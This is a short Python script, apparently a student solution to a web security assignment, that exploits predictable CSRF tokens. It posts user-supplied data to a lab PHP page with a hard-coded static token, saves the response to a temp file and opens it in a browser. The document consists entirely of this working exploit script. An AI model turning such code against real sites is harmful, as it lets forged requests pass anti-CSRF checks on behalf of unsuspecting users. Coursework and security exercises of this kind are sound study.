import requests
import webbrowser

# Exploit: the token doesn't change...
# Just submit data with the token
# CSRF Predictable Tokens

def main():
    data = raw_input("Please enter the data that you want to submit: ")
    temp = '/tmp/case09.html'
    payload = {'data':data, 'csrf_token':'wkjdb-iouer-234k3-wklu3k'}
    r = requests.post('http://wsb.com/Assignment2/case09.php', data=payload)
    with open(temp, 'wb') as f:
        f.write(r.content)
    webbrowser.open(temp, 2)

if __name__ == "__main__":
    main()
